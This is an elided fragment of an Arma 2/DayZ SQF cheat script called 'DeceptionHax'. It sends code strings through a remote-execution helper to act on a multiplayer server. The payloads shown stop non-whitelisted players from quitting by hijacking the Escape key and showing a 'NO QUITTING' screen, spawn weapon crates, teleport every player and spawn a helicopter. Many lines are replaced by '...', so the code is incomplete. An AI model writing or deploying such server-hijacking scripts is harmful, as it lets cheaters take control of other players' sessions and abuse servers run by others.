...
[_initdome1] execVM "DeceptionHax\exec.sqf";
...
[_initdome2] execVM "DeceptionHax\exec.sqf";
...
[_initdome3] execVM "DeceptionHax\exec.sqf";
...
[_initdome4] execVM "DeceptionHax\exec.sqf";
...
[_initdome5] execVM "DeceptionHax\exec.sqf";
...
[_initdome6] execVM "DeceptionHax\exec.sqf";
...
[_initdome7] execVM "DeceptionHax\exec.sqf";
...
[_initdome8] execVM "DeceptionHax\exec.sqf";
...
[_initdome9] execVM "DeceptionHax\exec.sqf";
...
[_initdome10] execVM "DeceptionHax\exec.sqf";

sleep 3;

_noquit = format ["if !(getPlayerUID player in %1) then
{
	(findDisplay 46) displayAddEventHandler ['KeyDown', 'if (((_this select 1) == 0x01) or ((_this select 1) == 0x62)) then
	{
		...
		startLoadingScreen ["" NO QUITTING.. ""];
...
[_noquit] execVM "DeceptionHax\exec.sqf";
...
[_crate] execVM "DeceptionHax\exec.sqf";
...
[_cratewep] execVM "DeceptionHax\exec.sqf";
...
[_cratemag] execVM "DeceptionHax\exec.sqf";
...
[_tpall] execVM "DeceptionHax\exec.sqf";
...
[_helitimer] execVM "DeceptionHax\exec.sqf";

sleep 120;

_heli = "if (isServer) then {[0, nil, [0, [4825,9870,0]], 'Mi17_DZ'] call local_publishObj;}; cutText ['Mi17_DZ incoming', 'PLAIN', 2];";
[_heli] execVM "DeceptionHax\exec.sqf";